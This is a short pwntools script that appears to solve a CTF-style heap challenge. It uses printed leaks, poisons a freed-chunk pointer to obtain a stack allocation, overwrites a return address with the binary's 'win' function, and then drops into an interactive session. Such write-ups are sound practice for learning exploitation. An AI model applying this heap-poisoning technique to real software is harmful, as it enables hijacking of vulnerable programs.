#!/bin/python 

from pwn import *
import sys

BUFFER_OFF = 0x118
GOAL = "win"

def get_leak():
    proc.recvuntil(b"[LEAK]")
    proc.recvuntil(b": ")
    return int(proc.recvline(drop=True)[:-1], 16)


def malloc(idx, size):
    proc.sendline(b"malloc")
    proc.sendline(str(idx))
    proc.sendline(str(size))


def free(idx):
    proc.sendline(b"free")
    proc.sendline(str(idx))


def scanf(idx, contents: bytes):
    proc.sendline(b"scanf")
    proc.sendline(str(idx))
    proc.sendline(contents)


def puts(idx):
    proc.sendline(b"puts")
    proc.clean()
    proc.sendline(str(idx))

    proc.recvuntil(b"Data: ")
    return proc.recvline(drop=True)


bin_idx = 1
def overwrite_next(contents: bytes):
    global bin_idx

    malloc(14, bin_idx)
    malloc(15, bin_idx)
    bin_idx *= 16

    free(15)
    free(14)

    scanf(14, contents)


proc = process(sys.argv[1])
elf = proc.elf

stack_leak = get_leak() + BUFFER_OFF
main_leak  = get_leak()
goal_addr  = (main_leak & 0xFFFFFFFFF000) + (elf.symbols[GOAL] & 0x0FFF)
print("[+] Goal address: " + hex(goal_addr))

overwrite_next(p64(stack_leak))
malloc(1, bin_idx)
malloc(0, bin_idx)
scanf(0, p64(goal_addr))

proc.sendline(b"quit")
proc.interactive()
